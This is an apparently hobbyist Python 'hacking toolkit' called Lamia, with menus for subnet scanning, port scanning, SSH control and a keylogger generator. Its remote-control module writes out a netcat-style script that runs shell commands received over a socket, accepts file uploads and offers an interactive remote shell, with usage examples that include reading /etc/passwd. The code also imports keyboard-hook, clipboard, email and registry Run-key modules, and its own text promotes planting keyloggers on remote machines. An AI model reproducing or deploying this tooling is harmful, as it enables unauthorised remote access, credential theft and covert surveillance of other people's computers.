# -*- coding: utf-8 -*-
# !/opt/local/bin/python3
try:
    import sys, os
    import time
    import subprocess
    import platform
    import socket
    import getpass
    import paramiko
    import random
    import getmac
    import datetime
    from itertools import product
    from os import path
    from ctypes import *
    from pythonping import ping
    import pyWinhook
    import win32clipboard
    import smtplib
    import winreg
    from email.mime.text import MIMETextgetopt
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
    import getopt
    import threading
    import pdb

except:
    pass

class Bcolors:
    Magenta = "\033[35m"
    Pass = "\033[32m"
    Error = "\033[31m"
    WARNING = "\033[33m"
    ENDC = '\033[0m'

try:
    # NetworkScanner
    OpenPortsAndServices = {}
    # /NetworkScanner

    # Startup
    load = f''
    check_compabilty = f"The script checks compatibility..."
    statup_message = f'{Bcolors.Magenta}Lamia{Bcolors.ENDC} is starts up...'
    # /Startup

    # Key
    USER_NAME = getpass.getuser()
    date = datetime.datetime.now()
    date = date.strftime("%Y-%m-%d %H:%M")
    ip = socket.gethostbyname(socket.gethostname())
    user32 = windll.user32
    kernel32 = windll.kernel32
    psapi = windll.psapi
    current_window = None
    key = rf"C:\Users\{USER_NAME}\key.txt"
    keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'
    # /Key
except:
    pass



# User information
try:
    user_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    user_ip.connect(("8.8.8.8", 80))
except:
    print(f'{Bcolors.Error}Error!{Bcolors.ENDC} You must have a network connection to run script!')
    time.sleep(2)
    sys.exit()
# /User information


class Welcome_message:
    def lami_load_screen(self):
        for char in load:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.1)
        time.sleep(0.1)
        Clear.clear()
        for char in statup_message:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.1)
        time.sleep(1)
        Clear.clear()

class Install_package:
    def windows_package(self):
        try:
            subprocess.call('pip install pywin32')
            subprocess.call('pip install pyWinhook')
            subprocess.call('pip install pythoncom')
            subprocess.call('pip install getmac')
            subprocess.call('pip install paramiko')
            subprocess.call('pip install pythonping')
        except:
            pass

    def linux_package(self):
        try:
            os.system('pip3 install getmac')
            os.system('pip3 install paramiko')
            os.system('pip3 install pythonping')
        except:
            pass



class User_Info:
    def user_information(self):
        if os.name == 'nt' or os.name == 'posix':
            if os.name == 'posix':
                permissions = os.getuid()
                if permissions != 0:
                    print(
                        f'{Bcolors.Error}Error! {Bcolors.ENDC}You must run script as root! Write: {Bcolors.WARNING}sudo python3 Lamia.py{Bcolors.ENDC}')
                    time.sleep(3)
                    sys.exit()
                elif permissions == 0:
                    pass
            print('The script will check if the required packages are installed...')
            reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
            installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
            time.sleep(0.5)
            missing = 0
            if os.name == 'nt':

                if 'pyWinhook' in installed_packages:
                    print('Package: pyWinhook', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
                else:
                    print('Package: pyWinhook',
                          f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install pyWinhook{Bcolors.ENDC}')
                    missing += 1
                time.sleep(0.5)

                if 'pywin32' in installed_packages:
                    print('Package: pywin32', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
                else:
                    print('Package: pywin32',
                          f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install pywin32{Bcolors.ENDC}')
                    missing += 1
                time.sleep(0.5)

                if 'pywin32' in installed_packages:
                    print('Package: pythoncom', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
                else:
                    print('Package: pythoncom',
                          f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install pythoncom{Bcolors.ENDC}')
                    missing += 1
                time.sleep(0.5)
            elif os.name != 'nt':
                pass

            if 'getmac' in installed_packages:
                print('Package: getmac', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            else:
                print('Package: getmac',
                      f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install getmac{Bcolors.ENDC}')
                missing += 1
            time.sleep(0.5)

            if 'paramiko' in installed_packages:
                print('Package: paramiko', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            else:
                print('Package: paramiko',
                      f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install paramiko{Bcolors.ENDC}')
                missing += 1
            time.sleep(0.5)


            if 'pythonping' in installed_packages:
                print('Package: pythonping', f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            else:
                print('Package: pythonping',
                      f'{Bcolors.Error} Missing!{Bcolors.ENDC}' + f' Write this line to install: {Bcolors.WARNING}pip install pythonping{Bcolors.ENDC}')
                missing += 1
            time.sleep(0.5)

            if missing == 0:
                print(f'-------------{Bcolors.Pass}OK!{Bcolors.ENDC}-------------------')
            elif missing > 0:
                print(f'-------------{Bcolors.Error}Error!{Bcolors.ENDC}-------------------')
            time.sleep(1)
            if missing != 0:
                print(f'You must install all required packages! Do you want to install the packages automatically? {Bcolors.WARNING}y/n{Bcolors.ENDC}')
                missing_choice = str(input('> '))
                if missing_choice == 'y':
                    Clear.clear()
                    print('Wait...')
                    if os.name == 'nt':
                        Install_package.windows_package(self)
                    elif os.name != 'nt':
                        Install_package.linux_package(self)



                elif missing_choice == 'n':
                    Clear.clear()
                    print('Install all required packages!')
                    time.sleep(3)
                    sys.exit()
            Clear.clear()


            for char in check_compabilty:
                sys.stdout.write(char)
                sys.stdout.flush()
                time.sleep(0.1)
            time.sleep(1)
            Clear.clear()
            user_platform = platform.system() + ' ' + platform.release()
            user_platform_verison = platform.version()
            user_mac = getmac.get_mac_address()
            print(f'-------------{Bcolors.WARNING}WAIT!{Bcolors.ENDC}------------------')
            time.sleep(0.5)
            print(f'Platform: {user_platform}' + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            time.sleep(0.5)
            print(f'Version: {user_platform_verison}' + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            time.sleep(0.5)
            if user_ip != '127.0.0.1':
                print('IP:', user_ip.getsockname()[0] + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            else:
                print('IP:', user_ip.getsockname()[0] + f'{Bcolors.Error} Error!{Bcolors.ENDC}')
            time.sleep(0.5)
            print('MAC:', user_mac + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            print(f'----------------{Bcolors.Pass}OK!{Bcolors.ENDC}----------------')
            time.sleep(2)


class Clear:
    if os.name == "nt":
        clear = lambda: os.system('cls')
    else:
        clear = lambda: os.system('clear')


class Main_menu:
    def menu(self):
        print(f'-----------------{Bcolors.Magenta}VERSION 1.3{Bcolors.ENDC}--------------------------')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}1.NETWORK SCANNER{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}2.REMOTE CONTROL{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}3.PASSWORD GENERATOR{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}4.KEY-HOOK GENERATOR{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}0.EXIT{Bcolors.ENDC}')
        time.sleep(0.5)
        main_menu_choice = str(input('> '))
        if main_menu_choice == '1':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                NetworkScanner().main()
        if main_menu_choice == '2':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                REMOTE_CONTROL.remote_control_startup(self)
        if main_menu_choice == '3':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                Password_Generator.password_generator_start(self)
        if main_menu_choice == '4':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                Key_Hook.key_hook_check_compabilty(self)
        if main_menu_choice == '0':
            close_message = 'Exit...'
            for char in close_message:
                sys.stdout.write(char)
                sys.stdout.flush()
                time.sleep(0.1)
            print('\n')
            sys.exit()
        elif main_menu_choice != '1' or main_menu_choice != '2' or main_menu_choice != '3' or main_menu_choice != '4' or main_menu_choice != '0':
            print('Wrong choice!')
            self.count_main_menu += 1
            time.sleep(2)
            L.start_up()



class Lamia:

    def __init__(self):
        self.count_main_menu: int = 0

    def start_up(self):
        if self.count_main_menu == 0:
            Welcome_message.lami_load_screen(self)
            User_Info.user_information(self)
            Clear.clear()
            Main_menu.menu(self)
        elif self.count_main_menu != 0:
            Clear.clear()
            Main_menu.menu(self)


class NetworkScanner(User_Info):
    def __init__(self):
        self.ip: str = ''
        self.hostname: str = ''
        self.mac: str = ''
        self.platform: str = ''
        self.port: int = 0
        self.service: str = ''
        self.ActiveHost: str = ''

    def NetworkScanner_menu(self):
        network_scanner_load_message = f"{Bcolors.Magenta}Network Scanner{Bcolors.ENDC} is starts up...."
        for char in network_scanner_load_message:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.1)
        time.sleep(1)
        Clear.clear()
        Clear.clear()
        print(f'------------------------------{Bcolors.Magenta}QUICK MODULE{Bcolors.ENDC}--------------------------------')
        print(f'{Bcolors.Magenta}QUICK{Bcolors.ENDC} module will find all {Bcolors.Pass}ACTIVE{Bcolors.ENDC} computers in chosen network and display thier {Bcolors.WARNING}IP{Bcolors.ENDC} address.')
        print('----------------------------------------------------------------------------------------------------------\n')
        print(f'------------------------------{Bcolors.Magenta}INTENSE MODULE{Bcolors.ENDC}------------------------------')
        print(f'{Bcolors.Magenta}INTENSE{Bcolors.ENDC} module will search for {Bcolors.Pass}ACTIVE{Bcolors.ENDC} computers  in chosen network, if it hits the {Bcolors.Pass}ACTIVE{Bcolors.ENDC} computer, it will try to get as much information as possible about this active computer.')
        print(f'For example, this script will try to find the {Bcolors.WARNING}IP ADDRESS{Bcolors.ENDC}, {Bcolors.WARNING}MAC ADDRESS{Bcolors.ENDC}, {Bcolors.WARNING}HOSTNAME{Bcolors.ENDC}, {Bcolors.WARNING}OPERATING SYSTEM NAME{Bcolors.ENDC} of this {Bcolors.Pass}ACTIVE{Bcolors.ENDC} computer. This script will search all {Bcolors.Pass}OPEN {Bcolors.ENDC}{Bcolors.WARNING}PORTS{Bcolors.ENDC} on this {Bcolors.Pass}ACTIVE{Bcolors.ENDC} computer, if any are {Bcolors.Pass}OPEN{Bcolors.ENDC} it will try to find out what {Bcolors.WARNING}SERVICES{Bcolors.ENDC} work on these ports.')
        print('----------------------------------------------------------------------------------------------------------\n')
        print(f'Do you want to use {Bcolors.Magenta}QUICK{Bcolors.ENDC} or {Bcolors.Magenta}INTENSE{Bcolors.ENDC} module? {Bcolors.WARNING}Q/I{Bcolors.ENDC}')
        network_scanner_module_choice = input('> ')
        if network_scanner_module_choice == 'i' or network_scanner_module_choice == 'I':
            self.network_scanner_module = f'{Bcolors.Magenta}MODULE INTENSE{Bcolors.ENDC}'
            Clear.clear()
            pass
        elif network_scanner_module_choice == 'q' or network_scanner_module_choice == 'Q':
            self.network_scanner_module = f'{Bcolors.Magenta}MODULE QUICK{Bcolors.ENDC}'
            Clear.clear()
            NetworkScanner.network_scanner_quick(self)
        elif network_scanner_module_choice != 'q' or network_scanner_module_choice == 'Q' or network_scanner_module_choice != 'i' or network_scanner_module_choice == 'I':
            self.network_scanner_module = f'{Bcolors.Magenta}MODULE INTENSE{Bcolors.ENDC}'
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong choice!')
            print(f'{Bcolors.Magenta}Network Scanner{Bcolors.ENDC} is running default in {Bcolors.Magenta}INTENSE{Bcolors.ENDC} mode!')
            time.sleep(2)
            Clear.clear()
            pass
        Clear.clear()
        if os.name == 'nt':
            self.check_default = os.path.isdir(rf'C:\Users\{USER_NAME}\Desktop')
        if os.name != 'nt':
            self.check_default = os.path.isdir(rf'/root')
        if self.check_default == True:
            if os.name == 'nt':
                print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER {Bcolors.ENDC}{self.network_scanner_module}--------------------------')
                self.check_default = os.path.abspath(rf'C:\Users\{USER_NAME}\Desktop')
                print(f"Do you to want scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default}{Bcolors.ENDC}")
                self.check_default = rf'C:\Users\{USER_NAME}\Desktop\ActiveHost.txt'
                self.check_default_choice = str(input('> '))
            if os.name != 'nt':
                print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER {Bcolors.ENDC}{self.network_scanner_module}--------------------------')
                self.check_default = os.path.abspath(rf'/root')
                print(f"Do you to want the scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default}{Bcolors.ENDC}")
                self.check_default = rf'/root/ActiveHost.txt'
                self.check_default_choice = str(input('> '))

            if self.check_default_choice == 'y':
                self.ActiveHost = self.check_default
                Clear.clear()
            elif self.check_default_choice == 'n':
                NetworkScanner.network_scanner_user_save(self)
                Clear.clear()
            else:
                self.ActiveHost = self.check_default
                print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER {Bcolors.ENDC}{self.network_scanner_module}--------------------------')
                print(f'Script will save output in default location: {Bcolors.WARNING}{self.ActiveHost}{Bcolors.ENDC}')
                time.sleep(2)
                Clear.clear()

    def network_scanner_user_save(self):
        while path.isfile(fr'{self.ActiveHost}') is not True:
            print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER {Bcolors.ENDC}{self.network_scanner_module}--------------------------')
            try:
                print(f'Save file in {Bcolors.WARNING}.txt{Bcolors.ENDC} format')
                print('Type here path where script will save output: ', end='')
                self.ActiveHost = str(input(r''))
                with open(f'{self.ActiveHost}', 'w') as f:
                    f.write(str('='))
            except OSError:
                if path.isfile(fr'{self.ActiveHost}') == False:
                    print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong file name!')
                    time.sleep(2)
                    Clear.clear()
                    NetworkScanner.network_scanner_user_save(self)

    def save_output(self):
        with open(self.ActiveHost, 'a') as fp:
            fp.write(f'======================================' + '\n')
            fp.write(f'Platform: {self.platform}' + '\n')
            fp.write(f'HOST: {self.hostname}' + '\n')
            fp.write(f'IP: {self.ip}' + '\n')
            fp.write(f'MAC: {self.mac}' + '\n')
            for self.port in OpenPortsAndServices:
                fp.write(f'Port: {self.port}' + ' ' + ' Service: ' + OpenPortsAndServices[self.port] + '\n')
            OpenPortsAndServices.clear()

    def check_open_ports(self):
        for self.port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            result = sock.connect_ex((self.ip, self.port,))
            try:
                self.service = socket.getservbyport(self.port, 'tcp')
            except OSError:
                pass
            if result == 0:
                print(f'Host {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC} with IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC} has an open port number: {Bcolors.WARNING}{self.port}{Bcolors.ENDC}. Service: {Bcolors.WARNING}{self.service}{Bcolors.ENDC}')
                OpenPortsAndServices.update({f'{self.port}': self.service})
            sock.close()
        print(f'===================================================================================\n')
    def get_remote_hostname(self):
        try:
            self.hostname = socket.gethostbyaddr(self.ip)[0]
        except socket.herror:
            print(f'Device with IP: {self.ip} is in {Bcolors.Error}drop mode{Bcolors.ENDC}')



    def network_scanner_quick(self):
        print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER{Bcolors.ENDC} {self.network_scanner_module}--------------------------')
        parts_ip = user_ip.getsockname()[0].split('.')
        part_0 = parts_ip[0]
        part_1 = parts_ip[1]
        part_2 = parts_ip[2]
        user_recomended_ip = part_0 + '.' + part_1 + '.' + part_2 + '.'
        print(f'YOUR IP ADDRESS: {Bcolors.WARNING}{user_ip.getsockname()[0]}{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}RECOMMENDED{Bcolors.ENDC} If you want to scan your network type {Bcolors.WARNING}{user_recomended_ip}{Bcolors.ENDC}')
        ip1 = str(input('> '))
        ip_active = []
        self.start_time = time.time()
        for num in range(1, 257):
            if num == 256:
                print()
                if len(ip_active) == 0:
                    print("The script can't find single active host in given network area. Script will be scanning more slowly. Wait...\n")
                    for num in range(1, 257):
                        if num == 256:
                            print()
                            if len(ip_active) == 0:
                                print(f'Something  is {Bcolors.Error}BLOCKS{Bcolors.ENDC} {Bcolors.Magenta}NETWORK SCANNER{Bcolors.ENDC}. Use {Bcolors.Magenta}INTENSE MODULE{Bcolors.ENDC}')
                                input('Press enter to continue...')
                                Clear.clear()
                                Main_menu.menu(self)
                            else:
                                print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                                print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (
                                            time.time() - self.start_time))
                                print(ip_active)
                                input('Press enter to continue...')
                                Clear.clear()
                                Main_menu.menu(self)

                        self.ip = 0
                        self.ip = ip1
                        self.ip = f'{self.ip}{num}'
                        command = ping(f'{self.ip}', timeout=0.1, count=1)
                        self.q = command.success()
                        if command.success() == True:
                            ip_active.append(self.ip)
                            print(f'Host with IP:{Bcolors.WARNING} {self.ip}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
                        else:
                            pass
                    if command.success() == True:
                        ip_active.append(self.ip)
                        print(f'Host with IP:{Bcolors.WARNING} {self.ip}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
                    else:
                        pass


                else:
                    print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                    print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - self.start_time))
                    print(ip_active)
                    input('Press enter to continue...')
                    Clear.clear()
                    Main_menu.menu(self)


            self.ip = 0
            self.ip = ip1
            self.ip = f'{self.ip}{num}'
            command = ping(f'{self.ip}', timeout=0.01, count=1)
            self.q = command.success()
            if command.success() == True:
                ip_active.append(self.ip)
                print(f'Host with IP:{Bcolors.WARNING} {self.ip}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
            else:
                pass

    def main(self):
        self.NetworkScanner_menu()
        parts_ip = user_ip.getsockname()[0].split('.')
        part_0 = parts_ip[0]
        part_1 = parts_ip[1]
        part_2 = parts_ip[2]
        user_recomended_ip = part_0 + '.' + part_1 + '.' + part_2 + '.'
        print(f'-----------------{Bcolors.Magenta}NETWORK SCANNER {Bcolors.ENDC}{self.network_scanner_module}--------------------------')
        print(f'YOUR IP ADDRESS: {Bcolors.WARNING}{user_ip.getsockname()[0]}{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}RECOMMENDED{Bcolors.ENDC} If you want to scan your network type {Bcolors.WARNING}{user_recomended_ip}{Bcolors.ENDC}')
        ip1 = str(input('> '))
        self.start_time = time.time()
        for num in range(1, 257):
            if num == 256:
                print()
                print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - self.start_time))
                input('Press enter to continue...')
                if os.name == 'nt':
                    Clear.clear()
                    os.system(fr'more {self.ActiveHost}')
                    print()
                    print(f'All results are saved here: {Bcolors.Pass}{self.ActiveHost}{Bcolors.ENDC}')
                    input('Press enter to continue...')
                    input()
                    Clear.clear()
                    Main_menu.menu(self)
                elif os.name != 'nt':
                    os.system(fr'cat {self.ActiveHost}')
                    print()
                    print(f'All results are saved here: {Bcolors.Pass}{self.ActiveHost}{Bcolors.ENDC}')
                    input('Press enter to continue...')
                    input()
                    Clear.clear()
                    Main_menu.menu(self)

            self.ip = 0
            self.ip = ip1
            self.ip = f'{self.ip}{num}'
            command = ping(f'{self.ip}', timeout=0.1, count=1)
            self.q = command.success()
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            param2 = '-w' if platform.system().lower() == 'windows' else '-c'
            command_after = ['ping',param,'1',param2,'100', self.ip]
            try:
                if command.success() == True:
                    print(f'\n=============================={Bcolors.Pass}{self.ip}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE{Bcolors.ENDC}=====================================')
                    print(f'Script will try to get more information about host {Bcolors.WARNING}{self.ip}{Bcolors.ENDC} ....')
                    if 'TTL' in subprocess.check_output(command_after).decode('UTF-8') or 'ttl' in subprocess.check_output(
                            command_after).decode('UTF-8'):
                        self.mac = getmac.get_mac_address(ip=str(self.ip))
                        NetworkScanner.get_remote_hostname(self)
                        if self.mac == None:
                            self.mac = getmac.get_mac_address()
                        if '128' in subprocess.check_output(command_after).decode('UTF-8'):
                            self.platform = 'Windows'
                            print(f'{Bcolors.ENDC}Platform: {Bcolors.WARNING}{self.platform}{Bcolors.ENDC} Hostname: {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC}  IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC}  MAC: {Bcolors.WARNING}{self.mac}{Bcolors.ENDC}')
                            self.check_open_ports()
                        elif '64' in subprocess.check_output(command_after).decode('UTF-8'):
                            self.platform = 'Linux'
                            print(f'{Bcolors.ENDC}Platform: {Bcolors.WARNING}{self.platform}{Bcolors.ENDC} Hostname: {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC}  IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC}  MAC: {Bcolors.WARNING}{self.mac}{Bcolors.ENDC}')
                            self.check_open_ports()
                        self.save_output()

                    else:
                        print(f'Most likely Device with IP: {self.ip} is {Bcolors.Error}turned off.{Bcolors.ENDC}')
                        print(f'\n')

                else:
                    pass
            except subprocess.CalledProcessError:
                pass








class REMOTE_CONTROL:
    def remote_control_startup(self):
        print(f'This module allows you to remotely connect to other computer. By using {Bcolors.WARNING}SSH{Bcolors.ENDC} or {Bcolors.WARNING}FIRST MODULE{Bcolors.ENDC} you can execute command on remote computers as well as you can upload generated {Bcolors.WARNING}KEY-HOOK to catch all symbols from keyboard connected with remote computer{Bcolors.ENDC}. {Bcolors.WARNING}NETWORK SCANNER{Bcolors.ENDC} module will suggest you {Bcolors.WARNING}PORTS{Bcolors.ENDC} where you can try to connect with using {Bcolors.WARNING}SSH{Bcolors.ENDC} module or find other {Bcolors.WARNING}PORTS{Bcolors.ENDC} and thier {Bcolors.WARNING}services{Bcolors.ENDC} where you can try to connect with using {Bcolors.WARNING}FIRST{Bcolors.ENDC} module. If remote computer {Bcolors.Error}requires password{Bcolors.ENDC} to connect you can {Bcolors.WARNING}generate it using PASSWORD GENERATOR{Bcolors.ENDC} module.')
        print(f' Do you want to continue {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        remote_control_choice = str(input('> '))
        Clear.clear()
        if remote_control_choice == 'y':
            time.sleep(1)
            Clear.clear()
            REMOTE_CONTROL.remote_control_menu(self)
        elif remote_control_choice == 'n':
            time.sleep(1)
            Clear.clear()
            Main_menu.menu(self)
        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong choice!')
            time.sleep(2)
            Clear.clear()
            Main_menu.menu(self)

    def remote_control_menu(self):
        print(f'-----------------{Bcolors.Magenta}REMOTE CONTROL MENU{Bcolors.ENDC}--------------------------')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}1.SSH{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}2.FIRST{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        time.sleep(0.5)
        remote_control_menu_choice = str(input('> '))
        if remote_control_menu_choice == '1':
            Clear.clear()
            SSH.ssh_command(self)
        elif remote_control_menu_choice == '2':
            Clear.clear()
            try:
                self.check_default_FIRST = os.path.isdir(rf'C:\Users\{USER_NAME}\Desktop')
                self.check_default_FIRST = os.path.abspath(rf'C:\Users\{USER_NAME}\Desktop')
                self.check_default_FIRST = rf'C:\Users\{USER_NAME}\Desktop\FIRST.py'
            except:
                print(f'{Bcolors.Error}Error!{Bcolors.ENDC} I have problems with save!')
                time.sleep(2)
            Clear.clear()
            with open(self.check_default_FIRST, 'w') as f:
                f.write(r"""
# -*- coding: big5 -*-
# !/opt/local/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import pdb


class First:
    def __init__(self):
        self.listen: bool = False
        self.command: bool = False
        self.upload: bool = False
        self.execute: str = ""
        self.target: str = ""
        self.upload_destination: str = ""
        self.port: int = 0

    def run_command(self, command: bytes):
        command = command.decode('utf8').rstrip()

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        except:
            output = "Nie udalo sie wykonac polecenia.\r\n"

        return output

    def client_handler(self, client_socket):
        print('Polaczenie', self, client_socket, file=sys.stderr)
        if len(self.upload_destination):

            file_buffer = ""

            while True:
                data = client_socket.recv(1024)

                if not data:
                    break
                else:
                    file_buffer += data

            try:
                file_descriptor = open(self.upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                client_socket.send(("Zapisano plik w %s\r\n" % (self.upload_destination,)).encode('utf8'))
            except:
                client_socket.send(("Nie udalo sie zapisac pliku w %s\r\n" % (self.upload_destination,)).encode('utf8'))

        if len(self.execute):
            output = self.run_command(self.execute)

            client_socket.send(output.encode('utf8'))

        if self.command:

            while True:

                client_socket.send(b"<FIRST:#> ")

                cmd_buffer = b""
                while b"\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                response = self.run_command(cmd_buffer)

                client_socket.send(response)

    def server_loop(self):

        if not len(self.target):
            self.target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.target, self.port))

        server.listen(5)

        while True:
            client_socket, addr = server.accept()
            print('Accepting %s from %s' % (client_socket, addr))
            client_thread = threading.Thread(target=First.client_handler, args=(self, client_socket,))
            client_thread.start()

    def client_sender(self, buffer: str):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            client.connect((self.target, self.port))
            print("Connect to:", self.target, "\n" + "On port:", self.port)
            if len(buffer):
                client.send(buffer.encode('utf8'))

            while True:

                recv_len = 1
                response = b""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break

                print(response.decode('utf8')),

                buffer = input("")
                buffer += "\n"

                client.send(buffer.encode('utf8'))


        except:
            print("\n" + "Lost Connection!", "\n" + "Error: Wyjatek[*]")
            client.close()

    def main(self):
        if not len(sys.argv[1:]):
            self.usage()

        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                       ["help", "listen", "execute", "target", "port", "command", "upload"])
        except getopt.GetoptError as err:
            self.usage()

        for o, a in opts:
            if o in ("-h", "--help"):
                self.usage()
            elif o in ("-l", "--listen"):
                self.listen = True
            elif o in ("-e", "--execute"):
                self.execute = a
            elif o in ("-c", "--commandshell"):
                self.command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                self.target = a
            elif o in ("-p", "--port"):
                self.port = int(a)
            else:
                assert False, "Nieobslugiwana opcja"

        if not self.listen and len(self.target) and self.port > 0:
            buffer = sys.stdin.readline()

            self.client_sender(buffer)

        if self.listen:
            self.server_loop()

    def usage(self):
        print('''
    Sposob uzycia: FIRST.py -t target_host -p port
    -l --listen                - nasluchuje na [host]:[port] przychodzacych polaczen
    -e --execute=file_to_run   - wykonuje dany plik, gdy zostanie nawiązanie połaczenie
    -c --command               - inicjuje wiersz polecen
    -u --upload=destination    - po nawiazaniu polaczenia wysyła plik i zapisuje go w [destination]
    -t -target                  - adres ip
    Przyklady: 
    first.py -t 192.168.0.1 -p 5555 -l -c
    first.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
    first.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\
    echo 'ABCDEFGHI' | ./first.py -t 192.168.11.12 -p 135
    Rozpoczecie nasluchiwania:
    python3 FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python3 FIRST.py -t 192.168.0.1 -p 1234 
    Ewentualnie:
    Rozpoczecie nasluchiwania:
    python FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python FIRST.py -t 192.168.0.1 -p 1234 
    ''')
        sys.exit(0)


if __name__ == '__main__':
    First().main()
            """)
            Clear.clear()
            print(f'Script will save here: {Bcolors.WARNING}{self.check_default_FIRST}{Bcolors.ENDC}')
            input('Press enter to continue...')
        elif remote_control_menu_choice == '0':
            Clear.clear()
            Main_menu.menu(self)
        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong choice!')
            time.sleep(2)
            Clear.clear()
            REMOTE_CONTROL.remote_control_menu(self)


class SSH:
    def __init__(self, ip_ssh, p, user, passw):
        self.ip_ssh: str = ip_ssh
        self.p: int = p
        self.user: str = user
        self.passw: str = passw


    def ssh_command(self):
        print(f'By Using this module you can connect to remote computer and control this computer using {Bcolors.WARNING}SSH.{Bcolors.ENDC} Once connected, you can execute the command on a remote computer. Do you want to connect {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        command_ssh = input('> ')
        if command_ssh == 'n':
            Clear.clear()
            Main_menu.menu(self)
        elif command_ssh == 'y':
            print(f'-----------------{Bcolors.Magenta}SSH MODULE{Bcolors.ENDC}--------------------------')
            time.sleep(0.5)
            print(f'After connection if you want to disconnect type {Bcolors.WARNING}0{Bcolors.ENDC}')
            print(f'Type {Bcolors.WARNING}IP{Bcolors.ENDC}: ', end='')
            self.ip_ssh = input('')
            print(f'Type {Bcolors.WARNING}Port{Bcolors.ENDC}: ', end='')
            self.p = input('')
